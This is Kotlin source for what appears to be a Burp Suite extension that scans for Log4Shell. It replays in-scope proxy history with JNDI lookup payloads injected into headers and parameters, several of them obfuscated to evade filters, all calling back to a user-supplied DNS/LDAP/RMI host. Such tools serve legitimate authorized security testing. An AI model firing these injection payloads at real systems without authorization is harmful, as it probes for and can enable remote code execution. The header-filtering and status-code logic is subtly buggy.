package com.dexter0us.log4jScanner

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class Log4JScanner {
    
    private var history = callbacks.proxyHistory

    fun scanner(
        dnsToken: String,
        payloadCB: Int,
        customPayload: String,
        headerCB: Boolean,
        paramCB: Boolean,
        authToken: String
    ): ProcessResult {

        historySize = history.size
        val channel = Channel<Int>()
        val job = GlobalScope.launch(Dispatchers.Default) {

            val tab = Log4JTab()

            run lit@{
                history.forEachIndexed { index, it ->

                    if (!isActive) { return@lit }

                    if (index % 25 == 0) {
                        channel.send(index)
                    }
                    val reqInfo = helpers.analyzeRequest(it.httpService, it.request)
                    it.response ?: return@forEachIndexed
                    val respInfo = helpers.analyzeResponse(it.response)
                    val statusCode = respInfo.statusCode.toInt()

                    if ((callbacks.isInScope(reqInfo.url)) && (statusCode != 201 || statusCode != 304 || statusCode != 404)) {

                        if (headerCB) {
                            console(payload(dnsToken, payloadCB, customPayload))
                            val headerList = reqInfo.headers
//                            headerList.replaceAll {
//                                when {
//                                    it.startsWith("Origin:") -> it.replace(it, it.startsWith("Origin:"))
//                                    it.startsWith("User-Agent:") -> it.replace(it, "User-Agent: ${payload(dnsToken,payloadCB,customPayload)}")
//                                    it.startsWith("Referer:") -> it.replace(it, "Referer: ${payload(dnsToken,payloadCB,customPayload)}")
//                                    else -> it
//                                }
//                            }
                            headerList.removeIf {
                                it.startsWith("Origin:")
                                it.startsWith("User-Agent:")
                                it.startsWith("Referer:")
                            }
                            headerList.addAll(listOf
                                ("User-Agent: ${payload(dnsToken,payloadCB,customPayload)}",
                                "Referer: ${payload(dnsToken,payloadCB,customPayload)}",
                                "Origin: ${payload(dnsToken,payloadCB,customPayload)}")
                            )
                            if (authToken != "") {
                                headerList.add(tab.authTextBox.text)
                            }

                            val body = String(it.request).substring(reqInfo.bodyOffset)
                            val headerRequest = helpers.buildHttpMessage(headerList, body.toByteArray())
                            callbacks.makeHttpRequest(it.httpService, headerRequest)
                        }

                        if (paramCB) {
                            var newRequest = it.request
                            val parameters = reqInfo.parameters
                            parameters.forEach { param ->
                                when (param.type.toInt()) {
                                    0, 1, 2 -> {
                                        val updatedParameter = helpers.buildParameter(param.name, payload(dnsToken,payloadCB,customPayload), param.type)
                                        newRequest = helpers.updateParameter(it.request, updatedParameter)
                                    }
                                }
                            }
                            callbacks.makeHttpRequest(it.httpService, newRequest)
                        }

                    }
                }
                channel.close()
            }
        }
        return ProcessResult(channel, job)
    }
    private fun payload(_dnsToken: String, payloadIndex: Int, customPayload: String):String{
        val payloads = arrayOf(
            "\${jndi:ldap://",
            "\${jndi:\${lower:l}\${lower:d}a\${lower:p}://",
            "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://",
            "\${\${::-j}ndi:rmi://",
            "\${jndi:rmi://",
            "\${\${lower:jndi}:\${lower:rmi}://",
            "\${\${lower:\${lower:jndi}}:\${lower:rmi}://",
            "\${\${env:FOOBAR:-j}ndi\${env:FOOBAR:-:}\${env:FOOBAR:-l}dap\${env:FOOBAR:-:}//",
            "Custom Payload."
        )

        val rand = List(6) {
            (('a'..'z') + ('A'..'Z') + ('0'..'9')).random()
        }.joinToString("")

        val dnsToken = _dnsToken.removeSuffix("/")

        val payload = when (payloadIndex) {
            8 -> customPayload.split("[")[0]
            else -> payloads[payloadIndex]
        }

        var finalPayload = helpers.urlEncode("$payload$dnsToken/$rand}")
        finalPayload = finalPayload.replace("{", "%7b")
        finalPayload = finalPayload.replace("}", "%7d")
        return finalPayload
    }
}


